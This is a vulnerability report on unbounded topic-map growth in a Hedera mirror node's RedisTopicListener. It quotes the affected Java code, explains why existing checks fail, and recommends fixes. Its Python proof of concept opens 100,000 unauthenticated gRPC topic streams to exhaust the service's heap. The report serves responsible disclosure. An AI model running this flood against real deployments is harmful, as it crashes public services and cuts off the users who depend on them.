### Title
Unbounded `topicMessages` ConcurrentHashMap Growth via Distinct Topic ID Subscriptions in `RedisTopicListener`

### Summary
`RedisTopicListener.getSharedListener()` uses an unbounded `ConcurrentHashMap` keyed by topic channel name. Any unauthenticated gRPC caller can open long-lived subscriptions to an arbitrary number of distinct topic IDs, causing one map entry and one live Redis subscription per unique topic ID to accumulate indefinitely. No application-level cap exists on the number of concurrent distinct-topic subscriptions, making heap exhaustion and gRPC service disruption achievable without any privileges.

### Finding Description

**Exact code path:**

`RedisTopicListener.java`, line 33 (field declaration) and lines 59–61 (`getSharedListener`):

```java
// line 33
private final Map<String, Flux<TopicMessage>> topicMessages; // no size bound

// lines 59-61
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
```

`getTopic()` (lines 64–66) derives the map key purely from the caller-supplied `topicId`:

```java
private Topic getTopic(TopicMessageFilter filter) {
    return ChannelTopic.of(String.format("topic.%d", filter.getTopicId().getId()));
}
```

`subscribe()` (lines 68–79) creates a new `Flux` backed by a live Redis channel subscription and terminates with `.share()`. The cleanup path (`unsubscribe()`, lines 82–85) only fires via `doOnCancel` / `doOnComplete` — i.e., only when the **last** subscriber to that topic disconnects:

```java
.doOnCancel(() -> unsubscribe(topic))
.doOnComplete(() -> unsubscribe(topic))
...
.share();
```

**Root cause:** `computeIfAbsent` unconditionally inserts a new entry for every previously-unseen topic ID string. The map has no maximum size, no eviction policy, and no TTL. Cleanup is entirely subscriber-driven: as long as the attacker holds at least one open stream per topic, the entry — and its backing Redis subscription — persists.

**Exploit flow:**

1. Attacker opens a gRPC HTTP/2 connection (no authentication required by the controller layer).
2. For each of N distinct topic IDs (e.g., `topic.1` through `topic.1000000`), the attacker sends a `subscribeTopic` RPC and keeps the stream open.
3. `ConsensusController.subscribeTopic()` (lines 43–53) calls `topicMessageService.subscribeTopic()` → `topicListener.listen()` → `getSharedListener()`.
4. Each unique topic ID triggers `computeIfAbsent`, inserting a new `Flux<TopicMessage>` into `topicMessages` and opening a new Redis pub/sub channel.
5. The map grows to N entries; each entry holds a Reactor `Flux` object graph plus a Redis connection handle.
6. Heap is exhausted → JVM throws `OutOfMemoryError` → gRPC service crashes or becomes unresponsive, dropping all active topic message streams.

**Why existing checks are insufficient:**

- `topicExists()` in `TopicMessageServiceImpl` (lines 94–106): only validates that the entity exists and is of type `TOPIC`; it does not limit how many distinct topics a single caller may subscribe to. When `grpcProperties.isCheckTopicExists()` is `false`, even non-existent IDs pass through.
- `subscriberCount` (line 48): a Micrometer gauge for observability only — no enforcement threshold.
- `maxBufferSize` / `prefetch` in `ListenerProperties`: per-subscriber flow-control settings, irrelevant to map cardinality.
- No rate limiter, no per-IP connection cap, and no `maxTopics` property exist anywhere in the listener stack. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) 

### Impact Explanation

Heap exhaustion kills the gRPC process, causing all active `subscribeTopic` streams — including those used by smart contract event monitors — to be dropped simultaneously. Even short of a full OOM, a very large map degrades GC performance, increases latency, and can cause individual streams to time out or be misrouted due to scheduler starvation on `Schedulers.boundedElastic()`. Because the gRPC mirror node is the canonical off-chain source of HCS topic messages used by smart contract integrations, disrupting it breaks event-driven contract workflows with no direct fund loss but with concrete protocol-layer impact.

### Likelihood Explanation

The attack requires only the ability to send gRPC requests — no credentials, no on-chain funds, no special network position. HTTP/2 multiplexing allows thousands of concurrent streams over a small number of TCP connections, making the resource cost to the attacker negligible. The attack is fully repeatable: after a service restart the attacker can immediately re-flood. Any public-facing mirror node deployment is exposed.

### Recommendation

1. **Cap map size**: Enforce a configurable `maxTopics` limit in `ListenerProperties` and reject (or queue) `getSharedListener` calls that would exceed it.
2. **Per-IP / per-connection subscription limit**: Enforce at the gRPC interceptor layer before the call reaches `ConsensusController`.
3. **Use a bounded cache**: Replace the raw `ConcurrentHashMap` with a size-bounded cache (e.g., Caffeine `Cache` with a maximum entry count and time-based expiry) so stale entries are evicted even if the subscriber never cleanly disconnects.
4. **Idle-stream timeout**: Configure a server-side gRPC max-stream-idle timeout so abandoned streams are forcibly cancelled, triggering `doOnCancel` and map cleanup.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc as cs
from com.hederahashgraph.api.proto.java import consensus_service_pb2 as cp
from com.hederahashgraph.api.proto.java import basic_types_pb2 as bt

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = cs.ConsensusServiceStub(channel)

def subscribe(topic_num):
    req = cp.ConsensusTopicQuery(
        topicID=bt.TopicID(topicNum=topic_num)
    )
    # Keep stream open indefinitely
    for _ in stub.subscribeTopic(req):
        pass

threads = []
for i in range(1, 100_001):          # 100k distinct topic IDs
    t = threading.Thread(target=subscribe, args=(i,), daemon=True)
    t.start()
    threads.append(t)

# Each thread holds an open stream; topicMessages map grows to 100k entries.
# Redis opens 100k pub/sub channel subscriptions.
# JVM heap exhausted → OOM → gRPC service crashes.
for t in threads:
    t.join()
```

```java
    private Flux<TopicMessage> subscribe(Topic topic) {
        Duration interval = listenerProperties.getInterval();

        return container
                .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
                .map(Message::getMessage)
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
                .doOnError(t -> log.error("Error listening for messages", t))
                .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
    }

    private void unsubscribe(Topic topic) {
        topicMessages.remove(topic.getTopic());
        log.info("Unsubscribing from {}", topic);
    }
```

```java
    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")
                                        .type(EntityType.TOPIC)
                                        .build()))
                .filter(e -> e.getType() == EntityType.TOPIC)
                .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
    }
```
